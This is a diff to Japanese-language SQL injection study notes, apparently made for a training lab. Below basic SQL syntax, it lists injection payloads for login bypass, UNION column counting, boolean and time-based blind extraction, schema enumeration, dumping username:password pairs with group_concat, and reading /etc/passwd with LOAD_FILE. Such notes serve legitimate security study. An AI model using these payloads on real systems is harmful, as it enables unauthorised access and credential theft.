@@ -1,8 +1,50 @@
+#基本構文
+select * from users;
+select username,password from users;
+select * from users LIMIT 1; #1行のデータのみを返す
+select * from users where username='admin'; #usernameがadminのやつ
+select * from users where username != 'admin';　＃usernameがadminじゃないやつ
+select * from users where username='admin' or username='jon';　#usernameがamindもしくはjonのやつ
+select * from users where username='admin' and password='p4ssword';　＃usernameがadminかつpasswordがp4sswordのやつ
+select * from users where username like 'a%'; #文字 a で始まるユーザー名を持つ行
+select * from users where username like '%n'; #ユーザー名が文字 n で終わる行
+select * from users where username like '%mi%'; #ユーザー名にmi という文字が含まれる行
+SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers; #2 つのテーブルから結果を収集し、1 つの結果セットにまとめる
+insert into users (username,password) values ('bob','password123'); #
+update users SET username='root',password='pass123' where username='admin';
+delete from users where username='martin';
+
+//ログインのバイパス
+'or 1=1;-- -
+
 //カラム数の探知
-'orderby 1;-- - //数字を１ずつ増やす
+' order by 1;-- - #数字を１ずつ増やす
+1 union select 1;-- - #1,2,3みたいに数字を増やしていく
+https://website.thm/article?id=0 union select 1,2,3;-- - #URLにもできる
+https://website.thm/checkuser?username=admin' order by 4;-- - #order byもできる
+
+//DB名の特定
+union select null, null, database();-- -
+union null, null, null where database() like '%';-- - #ブールベースの認証だったとき%をワイルドカードでつかう'm%'など真応答が返ってくる文字を一文字ずつ試す
+UNION SELECT 1,2,3 from users where username like 'a% #ブールベースのユーザ名の特定
+
+//sleepの利用
+UNION SELECT SLEEP(5);-- -  #応答に５秒の停止がなければクエリが失敗している
+UNION SELECT SLEEP(5),2;--　#応答が５秒停止したらカラム数は２列ということがわかる
+union select sleep(5),2 where database() like 'a%';-- - #一文字ずつ停止する文字を総当たり
+UNION SELECT SLEEP(5),2 from テーブル名 where カラム名='admin' and カラム名 like 'a%';-- - #テーブル名、カラム名を特定し、ユーザ名やパスワードを１文字ずつ試す
 
 //バージン情報の列挙
 1' and 1=0 union select version(),null,null,null;-- -
+
+//テーブル情報の列挙
+UNION SELECT null,null,table_name FROM information_schema.tables;-- - #mysqlの場合
+
+//カラム情報の列挙
+union select null, null, column_name from information_schema.columns;-- -　#mysqlの場合
+
+//カラム内容の表示
+UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM table_name;-- -　#group_concatで１つの文字列にして：を足して、<br>で改行
 
 //LOAD_FILE()の利用
 'and 1=0 union select null,null,null,LOAD_FILE('/etc/passwd');-- -
